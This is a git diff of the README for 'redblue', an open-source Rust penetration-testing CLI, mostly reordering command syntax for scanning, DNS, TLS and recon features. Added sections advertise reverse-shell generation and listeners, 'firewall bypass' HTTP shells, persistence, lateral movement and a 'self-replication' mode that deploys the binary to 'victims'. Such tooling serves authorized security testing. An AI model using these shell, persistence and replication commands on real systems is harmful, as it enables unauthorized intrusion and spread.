@@ -6,7 +6,7 @@
 
 [![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Size](https://img.shields.io/badge/size-427KB-green.svg)](https://github.com/forattini-dev/redblue/releases)
+[![Size](https://img.shields.io/badge/size-2.7MB-green.svg)](https://github.com/forattini-dev/redblue/releases)
 [![CI](https://github.com/forattini-dev/redblue/workflows/CI/badge.svg)](https://github.com/forattini-dev/redblue/actions/workflows/ci.yml)
 [![Alpha Release](https://github.com/forattini-dev/redblue/workflows/Alpha%20Release/badge.svg)](https://github.com/forattini-dev/redblue/actions/workflows/alpha-release.yml)
 [![GitHub release](https://img.shields.io/github/v/release/forattini-dev/redblue?include_prereleases&label=latest)](https://github.com/forattini-dev/redblue/releases)
@@ -39,33 +39,37 @@ curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.
 curl -fsSL https://raw.githubusercontent.com/forattini-dev/redblue/main/install.sh | bash -s -- --channel alpha
 
 # Scan networks
-rb network ports scan 192.168.1.1 --preset common
-rb network host discover 10.0.0.0/24
+rb network scan ports 192.168.1.1 --preset common
+rb network discover host 10.0.0.0/24
 
 # Reconnaissance
-rb dns record lookup target.com --type MX
-rb recon domain whois target.com
+rb dns lookup record target.com --type MX
+rb recon whois domain target.com
 
 # Web security
-rb web asset security http://example.com
-rb web asset scan http://wordpress-site.com --cms
+rb web security asset http://example.com
+rb web cms-scan asset http://wordpress-site.com
 
-# TLS auditing
-rb tls security audit example.com
+# TLS intelligence & audits
+rb tls scan intel github.com
+rb tls audit security example.com
 
 # Cloud security
-rb cloud asset takeover subdomain.example.com
+rb cloud takeover asset subdomain.example.com
 
 # OSINT harvesting
-rb recon domain harvest example.com
+rb recon harvest domain example.com
+
+# Access & post-exploitation
+rb access create shell 10.0.0.1:4444 --protocol tcp
 
 # Exploitation (authorized testing only)
-rb exploit payload privesc /path/to/target
+rb exploit privesc payload /path/to/target
 ```
 
-**What you get:** Port scanning, DNS lookup, web testing, CMS scanning, TLS inspection, WHOIS lookup, network discovery, subdomain takeover detection, OSINT harvesting, exploitation framework, and 30+ more capabilities.
+**What you get:** Port scanning, DNS lookup, web testing, CMS scanning, TLS inspection, WHOIS lookup, network discovery, subdomain takeover detection, OSINT harvesting, exploitation framework, self-replication, and 30+ more capabilities.
 
-**What you need:** Nothing. Zero dependencies. One executable file (427KB).
+**What you need:** Nothing. Zero dependencies. One executable file (2.7MB with embedded wordlists).
 
 <div align="right">
 
@@ -119,10 +123,12 @@ rb exploit payload privesc /path/to/target
 ### 🛠️ Exploitation & Data Management
 - **Privilege Escalation** - LinPEAS/WinPEAS style scanning ✅
 - **Reverse Shells** - 11 shell types generation ✅
+- **Self-Replication** - Deploy rb binary to victims (Linux/Windows/MacOS) ✅
 - **Lateral Movement** - 11 techniques (SSH tunneling, PSExec, WMI, etc.) ✅
 - **Persistence Mechanisms** - 8 methods (cron, SSH keys, systemd, etc.) ✅
 - **Database Operations** - Binary format, CSV export, subnet analysis ✅
-- **Zero Dependencies** - No installation, no setup, 427KB binary
+- **Embedded Wordlists** - 4 curated lists (429 entries) for fuzzing ✅
+- **Zero Dependencies** - No installation, no setup, 2.7MB binary
 
 </td>
 </tr>
@@ -222,16 +228,16 @@ rb --version
 
 ```bash
 # Network reconnaissance (action-based)
-rb network ports scan 192.168.1.1 --preset common
-rb network host ping google.com
+rb network scan ports 192.168.1.1 --preset common
+rb network ping host google.com
 
 # DNS and domain intelligence (action-based)
-rb dns record lookup example.com
-rb recon domain whois example.com
+rb dns lookup record example.com
+rb recon whois domain example.com
 
 # Web security audit (action-based)
-rb web asset security http://intranet.local --security
-rb web asset scan http://blog.example.com --cms
+rb web security asset http://intranet.local --security
+rb web cms-scan asset http://blog.example.com
 ```
 
 ### Interactive Mode
@@ -241,7 +247,7 @@ rb web asset scan http://blog.example.com --cms
 rb repl example.com
 
 # Load previous session
-rb repl example.com.rdb
+rb repl example.com.rb-session
 ```
 
 ---
@@ -410,8 +416,8 @@ rb --version
 rb help
 
 # Quick tests (when builds are passing)
-rb dns record lookup google.com           # DNS test
-rb network ports scan 127.0.0.1 --preset web  # Port scan test
+rb dns lookup record google.com           # DNS test
+rb network scan ports 127.0.0.1 --preset web  # Port scan test
 ```
 
 ### 🧪 Testing the Installer
@@ -521,7 +527,7 @@ vim .redblue.yaml
 cp .redblue.example.yaml .redblue.yaml
 
 # Run from same directory
-rb network ports scan 192.168.1.1  # Uses ./.redblue.yaml
+rb network scan ports 192.168.1.1  # Uses ./.redblue.yaml
 ```
 
 #### Full Configuration Example
@@ -570,7 +576,7 @@ storage:
 
 ```
 1. Command-line flags (highest priority)
-   rb network ports scan 192.168.1.1 --threads 500
+   rb network scan ports 192.168.1.1 --threads 500
 
 2. Environment variables
    export REDBLUE_NETWORK_THREADS=300
@@ -592,7 +598,7 @@ network:
   threads: 1000
   timeout_ms: 500
 
-rb network ports scan 192.168.1.0/24  # Uses projectA config
+rb network scan ports 192.168.1.0/24  # Uses projectA config
 
 # Project B - Slow stealthy scanning
 cd ~/projects/projectB
@@ -602,7 +608,7 @@ network:
   timeout_ms: 5000
   request_delay_ms: 100
 
-rb network ports scan 10.0.0.0/24     # Uses projectB config
+rb network scan ports 10.0.0.0/24     # Uses projectB config
 ```
 
 #### Environment Variables
@@ -711,24 +717,24 @@ Changes take effect immediately - no restart required!
 
 ```bash
 # Preset-based scanning
-rb network ports scan 192.168.1.1 --preset common     # Top 100 ports
-rb network ports scan 192.168.1.1 --preset full       # All 65,535 ports
-rb network ports scan example.com --preset web        # Web ports only
+rb network scan ports 192.168.1.1 --preset common     # Top 100 ports
+rb network scan ports 192.168.1.1 --preset full       # All 65,535 ports
+rb network scan ports example.com --preset web        # Web ports only
 
 # Custom port ranges
-rb network ports range 10.0.0.1 80 443
+rb network range ports 10.0.0.1 80 443
 
 # Performance tuning
-rb network ports scan 192.168.1.1 --threads 500 --timeout 500
+rb network scan ports 192.168.1.1 --threads 500 --timeout 500
 
 # Host connectivity
-rb network host ping google.com --count 10
-rb network host discover 192.168.1.0/24
-rb network host fingerprint example.com --persist
+rb network ping host google.com --count 10
+rb network discover host 192.168.1.0/24
+rb network fingerprint host example.com --persist
 
 # Network path tracing
-rb network trace run 8.8.8.8              # Traceroute
-rb network trace mtr 8.8.8.8              # MTR monitoring
+rb network run trace 8.8.8.8              # Traceroute
+rb network mtr trace 8.8.8.8              # MTR monitoring
 ```
 
 **Capabilities:**
@@ -757,18 +763,18 @@ rb network trace mtr 8.8.8.8              # MTR monitoring
 
 ```bash
 # Record lookups
-rb dns record lookup google.com                       # A record
-rb dns record lookup example.com --type MX            # Mail servers
-rb dns record lookup example.com --type TXT           # TXT records
-rb dns record lookup example.com --type NS            # Nameservers
+rb dns lookup record google.com                       # A record
+rb dns lookup record example.com --type MX            # Mail servers
+rb dns lookup record example.com --type TXT           # TXT records
+rb dns lookup record example.com --type NS            # Nameservers
 
 # Supported types: A, AAAA, MX, NS, TXT, CNAME, SOA
 
 # Custom DNS server
-rb dns record lookup example.com --server 1.1.1.1
+rb dns lookup record example.com --server 1.1.1.1
 
 # Quick resolve
-rb dns record resolve github.com
+rb dns resolve record github.com
 ```
 
 **Capabilities:**
@@ -793,19 +799,20 @@ rb dns record resolve github.com
 
 ```bash
 # HTTP operations
-rb web asset get http://example.com
-rb web asset headers http://example.com
-rb web asset security --security http://example.com              # Security headers audit
+rb web get asset http://example.com
+rb web headers asset http://example.com
+rb web security asset http://example.com              # Security headers audit
 
-# TLS/SSL testing
-rb tls security cert google.com                          # Certificate inspection
-rb tls security cert example.com:8443                    # Custom port
-rb tls security audit example.com                    # TLS configuration audit
+# TLS/SSL intelligence
+rb web cert asset google.com:443                    # Certificate inspection (SNI aware)
+rb tls scan intel example.com                           # TLS stack fingerprinting
+rb tls audit security example.com                       # Full TLS configuration audit
+rb tls ciphers security example.com                     # Cipher enumeration (strength + ordering)
 
 # CMS detection and scanning
-rb web asset scan --cms http://example.com              # Auto-detect CMS
-rb web asset scan --cms http://blog.example.com --strategy wordpress
-rb web asset scan --cms http://site.example.com --strategy drupal
+rb web cms-scan asset http://example.com              # Auto-detect CMS
+rb web cms-scan asset http://blog.example.com --strategy wordpress
+rb web cms-scan asset http://site.example.com --strategy drupal
 
 # Web crawling (planned)
 rb web crawl http://example.com
@@ -839,26 +846,26 @@ rb web fuzz http://example.com --wordlist common.txt
 
 ```bash
 # WHOIS lookup
-rb recon domain whois example.com
-rb recon domain whois google.com --raw
+rb recon whois domain example.com
+rb recon whois domain google.com --raw
 
 # Subdomain enumeration
-rb recon domain subdomains example.com
-rb recon domain subdomains example.com --passive
+rb recon subdomains domain example.com
+rb recon subdomains domain example.com --passive
 
 # Data harvesting (theHarvester style) ✅ NEW
-rb recon domain harvest example.com              # Emails, IPs, subdomains, URLs
-rb recon domain harvest example.com --source all
+rb recon harvest domain example.com              # Emails, IPs, subdomains, URLs
+rb recon harvest domain example.com --source all
 
 # Historical URL discovery ✅ NEW
-rb recon domain urls example.com                 # Wayback Machine + URLScan + OTX
-rb recon domain urls example.com --years 5
+rb recon urls domain example.com                 # Wayback Machine + URLScan + OTX
+rb recon urls domain example.com --years 5
 
 # Email reconnaissance (planned)
-rb recon domain email user@example.com
+rb recon email domain user@example.com
 
 # Username OSINT (planned)
-rb recon domain osint username
+rb recon osint domain username
 ```
 
 **Capabilities:**
@@ -886,16 +893,16 @@ rb recon domain osint username
 
 ```bash
 # Full TLS security audit ✅ NEW
-rb tls security audit google.com                # Complete security audit
-rb tls security audit api.example.com --persist
+rb tls audit security google.com                # Complete security audit
+rb tls audit security api.example.com --persist
 
 # Cipher suite enumeration ✅ NEW
-rb tls security ciphers example.com             # List all supported ciphers
-rb tls security ciphers target.com -o json
+rb tls ciphers security example.com             # List all supported ciphers
+rb tls ciphers security target.com -o json
 
 # Vulnerability scanning ✅ NEW
-rb tls security vuln example.com                # Scan for known vulnerabilities
-rb tls security vuln mail.example.com:465       # Custom port
+rb tls vuln security example.com                # Scan for known vulnerabilities
+rb tls vuln security mail.example.com:465       # Custom port
 ```
 
 **Capabilities:**
@@ -921,15 +928,15 @@ rb tls security vuln mail.example.com:465       # Custom port
 
 ```bash
 # Subdomain takeover detection ✅ NEW
-rb cloud asset takeover subdomain.example.com   # Check single subdomain
-rb cloud asset takeover api.target.com --verbose
+rb cloud takeover asset subdomain.example.com   # Check single subdomain
+rb cloud takeover asset api.target.com --verbose
 
 # Batch scanning ✅ NEW
-rb cloud asset takeover-scan subdomains.txt     # Scan multiple subdomains
-rb cloud asset takeover-scan --input list.txt --persist
+rb cloud takeover-scan asset subdomains.txt     # Scan multiple subdomains
+rb cloud takeover-scan asset --input list.txt --persist
 
 # List vulnerable service fingerprints ✅ NEW
-rb cloud asset services                         # Show 25+ vulnerable services
+rb cloud services asset                         # Show 25+ vulnerable services
 ```
 
 **Capabilities:**
@@ -953,42 +960,57 @@ rb cloud asset services                         # Show 25+ vulnerable services
 
 **⚠️ AUTHORIZED TESTING ONLY - Privilege escalation, shells, and post-exploitation**
 
+**Remote shell lifecycle lives in the new `access` domain:**
+
+```bash
+rb access create shell 10.0.0.1:4444 --protocol tcp --type python
+rb access listen shell 4444 --protocol websocket
+rb access sessions shell
+rb access kill shell <session_id>
+```
+
 ```bash
 # Privilege escalation scanning ✅ NEW
-rb exploit payload privesc /path/to/target      # Scan for privesc vectors
-rb exploit payload privesc / --os linux
+rb exploit privesc payload /path/to/target      # Scan for privesc vectors
+rb exploit privesc payload / --os linux
 
 # TCP Reverse shell generation ✅
-rb exploit payload shell bash 10.0.0.1 4444     # Generate bash reverse shell
-rb exploit payload shell python 10.0.0.1 4444   # Python shell
+rb exploit shell payload bash 10.0.0.1 4444     # Generate bash reverse shell
+rb exploit shell payload python 10.0.0.1 4444   # Python shell
 # Supports: bash, python, php, powershell, nc, socat, awk, java, node, perl, ruby
 
 # HTTP Reverse shell generation ✅ NEW (Firewall Bypass)
-rb exploit payload http-shell --type bash --lhost 10.0.0.1 --lport 8080
-rb exploit payload http-shell --type python --lhost 192.168.1.100 --lport 80
-rb exploit payload http-shell --type powershell --lhost 10.10.10.10 --lport 443
-rb exploit payload http-shell --type php --lhost 172.16.0.1 --lport 8080
+rb exploit http-shell payload --type bash --lhost 10.0.0.1 --lport 8080
+rb exploit http-shell payload --type python --lhost 192.168.1.100 --lport 80
+rb exploit http-shell payload --type powershell --lhost 10.10.10.10 --lport 443
+rb exploit http-shell payload --type php --lhost 172.16.0.1 --lport 8080
 # Bypasses 80% of firewalls - looks like normal HTTP traffic!
 
 # Listener commands ✅
-rb exploit payload start --port 4444 --listener-type tcp    # TCP listener
-rb exploit payload start --port 8080 --listener-type http   # HTTP listener (NEW)
-rb exploit payload listener nc 4444                          # Netcat listener
-rb exploit payload listener metasploit 4444                  # Metasploit handler
+rb exploit start payload --port 4444 --listener-type tcp    # TCP listener
+rb exploit start payload --port 8080 --listener-type http   # HTTP listener (NEW)
+rb exploit listener payload nc 4444                          # Netcat listener
+rb exploit listener payload metasploit 4444                  # Metasploit handler
 
 # Lateral movement techniques ✅ NEW
-rb exploit payload lateral                      # Show 11 lateral movement techniques
+rb exploit lateral payload                      # Show 11 lateral movement techniques
 # SSH tunneling, PSExec, WMI, Pass-the-Hash, RDP, Kerberos, etc.
 
 # Persistence mechanisms ✅ NEW
-rb exploit payload persist                      # Show 8 persistence methods
+rb exploit persist payload                      # Show 8 persistence methods
 # Cron jobs, SSH keys, systemd services, registry, scheduled tasks, etc.
+
+# Self-replication (deploy rb binary to victims) ✅ NEW
+rb exploit replicate payload --os linux --output deploy.sh              # Linux deployment
+rb exploit replicate payload --os windows --persist --output deploy.ps1 # Windows with persistence
+rb exploit replicate payload --os macos                                 # MacOS (stdout)
 ```
 
 **Capabilities:**
 - **Privilege escalation scanning** - LinPEAS/WinPEAS style (Linux + Windows) ✅
 - **TCP reverse shells** - 11 shell types with customizable IP/port ✅
-- **HTTP reverse shells** - 4 languages (bash, python, powershell, php) - Firewall bypass! ✅ NEW
+- **HTTP reverse shells** - 4 languages (bash, python, powershell, php) - Firewall bypass! ✅
+- **Self-replication** - Deploy full redblue binary to victims (Linux/Windows/MacOS) ✅ NEW
 - **Listener support** - TCP and HTTP listeners with session management ✅
 - **Listener commands** - nc, socat, metasploit setup ✅
 - **Lateral movement** - 11 techniques (SSH, PSExec, WMI, Pass-the-Hash) ✅
@@ -1026,7 +1048,7 @@ Traditional TCP reverse shells require direct TCP connections on non-standard po
 
 ```bash
 # 1. Attacker: Start HTTP listener on port 8080
-rb exploit payload start --port 8080 --listener-type http
+rb exploit start payload --port 8080 --listener-type http
 
 # [*] HTTP listener started on 0.0.0.0:8080
 # [*] Waiting for HTTP reverse shell connections...
@@ -1036,7 +1058,7 @@ rb exploit payload start --port 8080 --listener-type http
 #     POST /output/<id>   - Receive command output
 
 # 2. Attacker: Generate Python HTTP reverse shell payload
-rb exploit payload http-shell --type python --lhost 192.168.1.100 --lport 8080
+rb exploit http-shell payload --type python --lhost 192.168.1.100 --lport 8080
 
 # Output:
 # import urllib.request, subprocess, time, sys
@@ -1116,26 +1138,32 @@ python3 -c "$(cat payload.py)"
 
 ```bash
 # Query scan results ✅ NEW
-rb database data query example.com.rdb          # Query all data
-rb database data query target.rdb --type ports  # Filter by type
+rb database query data example.com.rdb          # Query all data
+rb database query data target.rdb --ip-range 192.0.2.1-192.0.2.255  # Filter ports by IP window
+rb database query data target.rdb --subdomain-prefix api.          # Subdomain prefix match
+rb database query data target.rdb --dns-prefix mail.               # DNS prefix match
 
 # Export to CSV ✅ NEW
-rb database data export example.com.rdb         # Export to CSV
-rb database data export target.rdb -o report.csv
+rb database export data example.com.rdb         # Export to CSV
+rb database export data target.rdb -o report.csv
 
 # List stored targets ✅ NEW
-rb database data list example.com.rdb           # List all targets
-rb database data list scan-results.rdb --verbose
+rb database list data example.com.rdb           # List all targets
+rb database list data scan-results.rdb --verbose
 
 # Subnet analysis ✅ NEW
-rb database data subnets targets.rdb            # Analyze subnet coverage
-rb database data subnets recon.rdb --summary
+rb database subnets data targets.rdb            # Analyze subnet coverage
+rb database subnets data recon.rdb --summary
+
+# Validate database integrity ✅ NEW
+rb database doctor data recon.rdb               # Inspect header, segments, record counts
 ```
 
 **Capabilities:**
 - **Binary format** - Segment-oriented storage (3x smaller than JSON, 5x faster) ✅
-- **Query operations** - Filter by type, target, date ✅
+- **Query operations** - Filter by type, IP range, and domain prefixes ✅
 - **CSV export** - Generate reports for external analysis ✅
+- **Integrity checks** - Quickly validate `.rdb` files before sharing ✅
 - **List targets** - View all stored targets and metadata ✅
 - **Subnet analysis** - Track reconnaissance coverage ✅
 
@@ -1154,67 +1182,82 @@ rb database data subnets recon.rdb --summary
 redblue speaks a single kubectl-style grammar:
 
 ```bash
-rb <domain> <resource> <verb> [target] [flags]
+rb <domain> <verb> <resource> [target] [flags]
 rb help
 rb <domain> help
 rb <domain> <resource> help
 ```
 
-- **domain** – capability area (`network`, `dns`, `recon`, `web`, `tls`, `exploit`, `cloud`, `database`, ...).
-- **resource** – dataset or tool inside the domain (`ports`, `host`, `record`, `asset`, `security`, `fingerprint`, `data`, ...).
-- **verb** – action to execute. We group verbs into:
-  - **Collector verbs** (`list`, `get`, `describe`, `export`, `report`, ...) read from RedDb and never trigger network activity.
-  - **Active verbs** (`scan`, `probe`, `discover`, `fingerprint`, `audit`, `harvest`, ...) launch live operations against targets.
+Legacy compatibility: `rb <domain> <resource> <verb>` still resolves today, but the CLI prints all help, usage, and examples using the new verb-first order. Start migrating scripts to the new layout so you stay aligned with future releases.
+
+- **domain** – capability area (`network`, `dns`, `recon`, `web`, `tls`, `access`, `exploit`, `cloud`, `code`, ...).
+- **verb** – action to execute (`scan`, `lookup`, `harvest`, `audit`, `create`, …). Verbs come in two families:
+  - **Collector verbs** (`list`, `get`, `describe`, `export`, …) read from RedDb and never trigger network activity.
+  - **Active verbs** (`scan`, `probe`, `discover`, `fingerprint`, `harvest`, `create`, …) launch live operations.
+- **resource** – dataset or tool inside the domain (`ports`, `host`, `record`, `asset`, `shell`, `intel`, `payload`, ...).
 - **target** – optional subject (host, domain, URL, CIDR, database file, etc.).
 - **flags** – optional modifiers (`--db`, `--timeout`, `--output`, `--threads`, ...).
 
-The order is deliberate: `rb network ports list` retrieves existing scan data, while `rb network ports scan` starts a brand-new port scan. Collector verbs must only touch persisted data; active verbs are the only path that performs live work.
+The order is deliberate: `rb network list ports` reads existing scan data, while `rb network scan ports` starts a live port scan. Collector verbs must only touch persisted data; active verbs are the only path that performs live work.
 
 **Collector verbs (read from RedDb):**
 ```bash
-rb network ports list 192.168.1.1 --db scans.rdb
-rb network host list 192.168.1.1 --db hosts.rdb
-rb database data list
-rb database data subnets
+rb network list host 192.168.1.1 --db hosts.rdb
+rb dns describe record example.com --db dns.rdb
+rb recon list domain example.com
+rb web list asset intranet.local --db web.rdb
 ```
 
 **Active verbs (perform live operations):**
 ```bash
-rb network ports scan 192.168.1.1 --preset common
-rb network host fingerprint example.com --persist
-rb dns record lookup example.com --type MX
-rb recon domain subdomains example.com
-rb tls security audit example.com
-rb web asset scan http://example.com --cms
+rb network scan ports 192.168.1.1 --preset common
+rb network run trace 8.8.8.8
+rb dns lookup record example.com --type MX
+rb recon subdomains domain example.com
+rb web cms-scan asset http://example.com
+rb tls scan intel github.com
+rb access create shell 10.0.0.1:4444 --protocol tcp
 ```
 
 ### Domain Organization
 
-```
-network/  Infrastructure operations & resources
-  Actions:   scan, trace, discover, probe
-  Resources: ports, hosts, routes, interfaces
-
-dns/      DNS operations & records
-  Actions:   resolve, lookup, enumerate, query
-  Resources: records, zones, nameservers
-
-domain/   Domain intelligence & reconnaissance
-  Actions:   whois, scan, enumerate, discover
-  Resources: subdomains, assets, records
-
-web/      Web application testing
-  Actions:   test, crawl, fuzz, audit, scan
-  Resources: endpoints, headers, cookies, forms
-
-tls/      TLS/SSL security
-  Actions:   audit, test, scan, verify
-  Resources: certificates, ciphers, chains
-
-osint/    Intelligence gathering (OSINT)
-  Actions:   gather, search, enumerate, harvest
-  Resources: findings, assets, intelligence
-```
+- **network**
+  - `scan|range|subnet ports` – TCP scanning presets and ranges
+  - `ping|discover|fingerprint|list host` – host discovery, ICMP, service intel
+  - `run|mtr trace` – traceroute and continuous MTR
+  - `listen|connect|scan|relay|broker nc` – full netcat replacement
+- **dns**
+  - `lookup|all|resolve|reverse|bruteforce record` – live DNS operations
+  - `list|get|describe record` – query cached DNS intelligence
+- **recon**
+  - `whois|subdomains|harvest|urls|osint|email domain` – OSINT workflows
+  - `list|get|describe domain` – report against stored recon data
+- **web**
+  - `get|headers|security|cert|fuzz|fingerprint|scan asset` – HTTP tooling
+  - `cms-scan|wpscan|drupal-scan|joomla-scan asset` – framework-aware scanning
+  - `linkfinder|crawl asset` – application mapping (crawl in progress)
+  - `list|describe asset` – offline summaries from RedDb
+- **tls**
+  - `scan|fingerprint|infrastructure intel` – passive TLS intelligence
+  - `audit|ciphers|vuln|list|get|describe security` – full TLS audits (modules pending re-enable)
+- **access**
+  - `create|listen|sessions|kill shell` – remote shell generation & management
+- **exploit**
+  - `privesc|shell|http-shell|dns-shell|multi-shell|encrypted-shell|icmp-shell|websocket-shell payload`
+  - `listener|start|sessions|lateral|persist|replicate payload`
+- **cloud**
+  - `takeover|takeover-scan|services asset` – subdomain takeover matrix
+  - `scan|enumerate storage` – S3-style bucket reconnaissance
+- **code**
+  - `scan secrets` – secret scanning (Gitleaks-style)
+  - `scan dependencies` – dependency vulnerability audit
+- **collection**
+  - `capture|batch screenshot` – visual recon (implementation in progress)
+- **wordlist**
+  - `list|info|status|init|install|update|remove collection` – wordlist lifecycle
+- **bench**
+  - `run|stress load` – HTTP load testing harness
+- **database** *(CLI routes temporarily disabled)* – binary RedDb tooling remains in the library for future builds
 
 ### Help System
 
@@ -1228,9 +1271,9 @@ rb network --help                # Network domain commands
 rb dns help                      # DNS domain commands
 
 # Verb/action help
-rb network ports scan --help           # Help for active network scan
-rb network host list --help            # Help for listing stored hosts
-rb dns record resolve --help           # Help for DNS resolve
+rb network scan ports --help           # Help for active network scan
+rb network list host --help            # Help for listing stored hosts
+rb dns resolve record --help           # Help for DNS resolve
 
 # Resource help
 rb network ports help            # Help for network/ports verbs
@@ -1282,7 +1325,7 @@ See what redblue actually returns:
 #### Port Scan Output
 
 ```bash
-$ rb network ports scan 192.168.1.1 --preset common
+$ rb network scan ports 192.168.1.1 --preset common
 
 🚨 Port Scan: 192.168.1.1
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1308,7 +1351,7 @@ PORT     STATE    SERVICE
 #### DNS Lookup Output
 
 ```bash
-$ rb dns record lookup example.com --type MX
+$ rb dns lookup record example.com --type MX
 
 🔍 DNS Lookup: example.com (MX records)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1327,7 +1370,7 @@ PRIORITY  HOSTNAME
 #### CMS Scan Output
 
 ```bash
-$ rb web asset scan --cms http://blog.example.com
+$ rb web cms-scan asset http://blog.example.com
 
 🔒 CMS Security Scan: http://blog.example.com
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1357,7 +1400,7 @@ Status:         ⚠️  Outdated (latest: 6.4.3)
 #### WHOIS Output
 
 ```bash
-$ rb recon domain whois example.com
+$ rb recon whois domain example.com
 
 📋 WHOIS Information: example.com
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1385,7 +1428,7 @@ Email:           admin@example.com (redacted)
 #### Network Discovery Output
 
 ```bash
-$ rb network host discover 192.168.1.0/24
+$ rb network discover host 192.168.1.0/24
 
 🌐 Network Discovery: 192.168.1.0/24
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1415,7 +1458,7 @@ IP ADDRESS       LATENCY    STATUS
 #### TLS Certificate Output
 
 ```bash
-$ rb tls security cert google.com
+$ rb web cert asset google.com:443
 
 🔒 TLS Certificate: google.com:443
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1454,54 +1497,54 @@ Self-Signed:     No ✓
 
 ```bash
 # Gather intelligence on target
-rb recon domain whois example.com
-rb dns record lookup example.com --type A
-rb dns record lookup example.com --type MX
-rb dns record lookup example.com --type NS
+rb recon whois domain example.com
+rb dns lookup record example.com --type A
+rb dns lookup record example.com --type MX
+rb dns lookup record example.com --type NS
 ```
 
 #### 2. Network Mapping
 
 ```bash
 # Discover live hosts
-rb network host discover 192.168.1.0/24
+rb network discover host 192.168.1.0/24
 
 # Check connectivity
-rb network host ping 192.168.1.1 --count 10
+rb network ping host 192.168.1.1 --count 10
 
 # Scan for services
-rb network ports scan 192.168.1.1 --preset common
+rb network scan ports 192.168.1.1 --preset common
 ```
 
 #### 3. Web Application Security Audit
 
 ```bash
 # Check security posture
-rb web asset security --security http://example.com
-rb tls security cert example.com
-rb web asset scan --cms http://example.com
+rb web security asset http://example.com
+rb tls audit security example.com
+rb web cms-scan asset http://example.com
 
 # Scan for open ports
-rb network ports scan example.com --preset full
+rb network scan ports example.com --preset full
 ```
 
 #### 4. WordPress Site Assessment
 
 ```bash
 # Auto-detect and scan
-rb web asset scan --cms http://blog.example.com
+rb web cms-scan asset http://blog.example.com
 
 # Force WordPress strategy
-rb web asset scan --cms http://blog.example.com --strategy wordpress
+rb web cms-scan asset http://blog.example.com --strategy wordpress
 ```
 
 #### 5. DNS Troubleshooting
 
 ```bash
 # Compare responses from different servers
-rb dns record lookup example.com --server 8.8.8.8         # Google
-rb dns record lookup example.com --server 1.1.1.1         # Cloudflare
-rb dns record lookup example.com --server 208.67.222.222  # OpenDNS
+rb dns lookup record example.com --server 8.8.8.8         # Google
+rb dns lookup record example.com --server 1.1.1.1         # Cloudflare
+rb dns lookup record example.com --server 208.67.222.222  # OpenDNS
 ```
 
 <div align="right">
@@ -1520,48 +1563,48 @@ redblue consolidates functionality from 30+ security tools:
 
 | Traditional Tool | redblue Command | Implementation | Status |
 |-----------------|----------------|----------------|--------|
-| **nmap** | `rb network ports scan` | Raw TCP sockets | ✅ |
-| **traceroute** | `rb network trace run` | ICMP hop detection | ✅ |
-| **mtr** | `rb network trace mtr` | MTR statistics | ✅ |
-| **fping** | `rb network host ping` | System ping wrapper | ✅ |
-| **netdiscover** | `rb network host discover` | ICMP sweep | ✅ |
-| **dig** | `rb dns record lookup` | RFC 1035 from scratch | ✅ |
-| **nslookup** | `rb dns record resolve` | RFC 1035 from scratch | ✅ |
-| **whois** | `rb recon domain whois` | RFC 3912 from scratch | ✅ |
-| **amass** | `rb recon domain subdomains` | Passive + active enum | ✅ |
-| **subfinder** | `rb recon domain subdomains --passive` | Passive enumeration | ✅ |
-| **theHarvester** | `rb recon domain harvest` | Multi-source OSINT | ✅ |
-| **waybackurls** | `rb recon domain urls` | Wayback Machine API | ✅ |
-| **gau** | `rb recon domain urls` | URLScan + OTX APIs | ✅ |
-| **curl** | `rb web asset get` | RFC 2616 from scratch | ✅ |
-| **wpscan** | `rb web asset scan --cms --strategy wordpress` | WordPress scanner | ✅ |
-| **droopescan** | `rb web asset scan --cms --strategy drupal` | Drupal/Joomla scanner | ✅ |
-| **sslyze** | `rb tls security audit` | TLS audit engine | ✅ |
-| **testssl.sh** | `rb tls security vuln` | Vulnerability scanner | ✅ |
-| **sslscan** | `rb tls security ciphers` | Cipher enumeration | ✅ |
-| **tko-subs** | `rb cloud asset takeover` | Takeover detection | ✅ |
-| **subjack** | `rb cloud asset takeover-scan` | Batch scanning | ✅ |
-| **LinPEAS** (partial) | `rb exploit payload privesc` | Privesc scanning | ✅ |
-| **WinPEAS** (partial) | `rb exploit payload privesc --os windows` | Privesc scanning | ✅ |
+| **nmap** | `rb network scan ports` | Raw TCP sockets | ✅ |
+| **traceroute** | `rb network run trace` | ICMP hop detection | ✅ |
+| **mtr** | `rb network mtr trace` | MTR statistics | ✅ |
+| **fping** | `rb network ping host` | System ping wrapper | ✅ |
+| **netdiscover** | `rb network discover host` | ICMP sweep | ✅ |
+| **dig** | `rb dns lookup record` | RFC 1035 from scratch | ✅ |
+| **nslookup** | `rb dns resolve record` | RFC 1035 from scratch | ✅ |
+| **whois** | `rb recon whois domain` | RFC 3912 from scratch | ✅ |
+| **amass** | `rb recon subdomains domain` | Passive + active enum | ✅ |
+| **subfinder** | `rb recon subdomains domain --passive` | Passive enumeration | ✅ |
+| **theHarvester** | `rb recon harvest domain` | Multi-source OSINT | ✅ |
+| **waybackurls** | `rb recon urls domain` | Wayback Machine API | ✅ |
+| **gau** | `rb recon urls domain` | URLScan + OTX APIs | ✅ |
+| **curl** | `rb web get asset` | RFC 2616 from scratch | ✅ |
+| **wpscan** | `rb web cms-scan asset --strategy wordpress` | WordPress scanner | ✅ |
+| **droopescan** | `rb web cms-scan asset --strategy drupal` | Drupal/Joomla scanner | ✅ |
+| **sslyze** | `rb tls audit security` | TLS audit engine | ✅ |
+| **testssl.sh** | `rb tls vuln security` | Vulnerability scanner | ✅ |
+| **sslscan** | `rb tls ciphers security` | Cipher enumeration | ✅ |
+| **tko-subs** | `rb cloud takeover asset` | Takeover detection | ✅ |
+| **subjack** | `rb cloud takeover-scan asset` | Batch scanning | ✅ |
+| **LinPEAS** (partial) | `rb exploit privesc payload` | Privesc scanning | ✅ |
